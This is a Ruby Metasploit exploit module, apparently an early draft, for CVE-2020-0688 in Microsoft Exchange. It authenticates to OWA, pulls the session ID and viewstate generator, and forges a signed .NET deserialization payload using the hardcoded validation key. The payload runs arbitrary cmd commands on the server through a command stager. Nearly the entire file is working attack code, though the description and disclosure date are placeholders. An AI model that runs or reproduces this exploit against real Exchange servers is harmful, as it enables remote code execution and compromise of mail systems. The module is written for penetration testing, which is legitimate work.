##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  # include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  DEFAULT_VIEWSTATE_GENERATOR = 'B97B4E27'
  VALIDATION_KEY = "\xcb\x27\x21\xab\xda\xf8\xe9\xdc\x51\x6d\x62\x1d\x8b\x8b\xf1\x3a\x2c\x9e\x86\x89\xa2\x53\x03\xbf"

  def initialize(info = {})
    super(update_info(info,
        'Name'           => 'Exchange Control Panel Viewstate Deserialization',
        'Description'    => %q{
          Template description.
        },
        'Author'         => 'Spencer McIntyre',
        'License'        => MSF_LICENSE,
        'References'     => [
            ['CVE', '2020-0688'],
            ['URL', 'https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys'],
        # https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys
        # https://github.com/Ridter/cve-2020-0688
        # https://github.com/microsoft/referencesource/blob/master/System.Web/Configuration/MachineKeySection.cs
        ],
        'Platform'       => 'win',
        'Targets'        =>
          [
            [ 'Windows (x86)', { 'Arch' => ARCH_X86 } ],
          ],
        'DefaultTarget'  => 0,
        'Privileged'     => true,
        'DisclosureDate' => 'Jan 1 2016'))

    # todo: set https / 443 as the default
    register_options([
      OptString.new('USERNAME', [ true, 'Username to authenticate as', '']),
      OptString.new('PASSWORD', [ true, 'The password to authenticate with'])
    ])
  end

  def check
    return Exploit::CheckCode::Unsupported
  end

  # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/10b218f5-9b2b-4947-b4b7-07725a2c8127
  def length_prefixed(string)
    prefix = []
    length = string.length
    while length > 0
      value = length & 0x7f
      length >>= 7
      value |= 0x80 if length > 0
      prefix << value
    end
    return prefix.pack('C*') + string
  end

  def generate_viewstate(generator, session_id, cmd)
    # LosFormatted
    resource_dictionary =  "<ResourceDictionary"
    resource_dictionary << "  xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\""
    resource_dictionary << "  xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\""
    resource_dictionary << "  xmlns:System=\"clr-namespace:System;assembly=mscorlib\""
    resource_dictionary << "  xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\">"
    resource_dictionary << "    <ObjectDataProvider x:Key=\"\" ObjectType = \"{x:Type Diag:Process}\" MethodName = \"Start\" >"
    resource_dictionary << "      <ObjectDataProvider.MethodParameters>"
    resource_dictionary << "        <System:String>cmd</System:String>"
    resource_dictionary << "        <System:String>/c #{cmd.encode(:xml => :text)}</System:String>"
    resource_dictionary << "      </ObjectDataProvider.MethodParameters>"
    resource_dictionary << "    </ObjectDataProvider>"
    resource_dictionary << "</ResourceDictionary>"

    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/a7e578d3-400a-4249-9424-7529d10d1b3c
    serialized  = "\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00"
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/7fcf30e1-4ad4-4410-8f1a-901a4a1ea832
    serialized << "\x0c\x02\x00\x00\x00\x5e"
    serialized << "Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/847b0b6a-86af-4203-8ed0-f84345f845b9
    serialized << "\x05"
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/0a192be0-58a1-41d0-8a54-9c91db0ab7bf
    serialized <<   "\x01\x00\x00\x00\x42"
    serialized <<   "Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties"
    serialized <<   "\x01\x00\x00\x00\x0f"
    serialized <<   "ForegroundBrush"
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/2d168388-37f4-408a-b5e0-e48dbce73e26
    serialized << "\x01\x02\x00\x00\x00\x06\x03\x00\x00\x00"
    serialized << length_prefixed(resource_dictionary)
    serialized << "\x0b"

    formatted =  "\xff\x01\x32"
    formatted << length_prefixed(serialized)
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/86fe94e6-c8f4-472a-b520-a9877a34fbbb

    mac_key_bytes = Rex::Text.hex_to_raw(generator).unpack('I<').pack('I>')
    mac_key_bytes << Rex::Text.to_unicode(session_id)

    signature = OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha1'), VALIDATION_KEY, formatted + mac_key_bytes)
    return Rex::Text.encode_base64(formatted + signature)
  end

  def exploit
    user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0"
    res = send_request_cgi({
        'content-type'  => 'application/x-www-form-urlencoded',
        'uri'           => normalize_uri(target_uri.path, 'owa', 'auth.owa'),
        'method'        => 'POST',
        'cookie'        => 'PrivateComputer=true; PBack=0',
        'headers'       => {
          "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
          "Upgrade-Insecure-Requests" => "1",
          "Connection" => "close",
          "Accept-Language" => "en-US,en;q=0.5",
        },
        'agent'     => user_agent,
        'vars_post'     => {
          'password' => datastore['PASSWORD'],
          'isUtf8' => '1',
          'passwordText' => '',
          'trusted' => '4',
          'flags' =>'4',
          'forcedownlevel' => '0',
          'destination' => 'https://192.168.159.129/owa',
          'username'=>datastore['USERNAME']
        }
    })
    cookies = [res.get_cookies]

    # todo: check if res is bad here
    res = send_request_cgi({
      'uri'           => normalize_uri(target_uri.path, 'ecp', 'default.aspx'),
      'method'        => 'GET',
      'cookie'        => res.get_cookies,
      'headers'       => {
        "Accept"      => "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Connection"  => "close",
        "Accept-Language" => "en-US,en;q=0.5",
      },
      'agent'  => user_agent
    })
    cookies << res.get_cookies

    viewstate_generator = res.body.scan(/id="__VIEWSTATEGENERATOR"\s+value="([a-fA-F0-9]{8})"/).flatten[0]
    if viewstate_generator.nil?
      print_warning("Failed to find the __VIEWSTATEGENERATOR, using the default value: #{DEFAULT_VIEWSTATE_GENERATOR}")
      viewstate_generator = DEFAULT_VIEWSTATE_GENERATOR
    else
      vprint_status("Recovered the __VIEWSTATEGENERATOR: #{viewstate_generator}")
    end

    session_id = res.get_cookies.scan(/ASP\.NET_SessionId=([\w\-]+);/).flatten[0]
    if session_id.nil?
      fail_with(Failure::UnexpectedReply, 'Failed to get the ASP.NET_SessionId from the response cookies')
    end
    vprint_status("Recovered the ASP.NET_SessionID: #{session_id}")

    @user_agent = user_agent
    @cookies = cookies
    @viewstate_generator = viewstate_generator
    @session_id = session_id
    # the major limit is the max length of a GET request, the command will be
    # XML escaped and then base64 encoded which both increase the size
    execute_cmdstager({:linemax => 450})
  end

  def execute_command(cmd, opts)
    print_line cmd
    viewstate = generate_viewstate(@viewstate_generator, @session_id, cmd)
    5.times do |iteration|
      send_request_cgi({
        'content-type'  => 'application/x-www-form-urlencoded',
        'uri'           => normalize_uri(target_uri.path, 'ecp', 'default.aspx'),
        'method'        => 'GET',
        'cookie'        => @cookies.join(''),
        'headers'       => {
          "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
          "Upgrade-Insecure-Requests" => "1",
          "Connection" => "close",
          "Accept-Language" => "en-US,en;q=0.5",
        },
        'agent'  => @user_agent,
        'vars_get'      => {
          '__VIEWSTATE'          => viewstate,
          '__VIEWSTATEGENERATOR' => @viewstate_generator
        }
      })
      break
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      sleep iteration
    end

    #fail_with(Failure::Unknown, 'testing')
  end
end
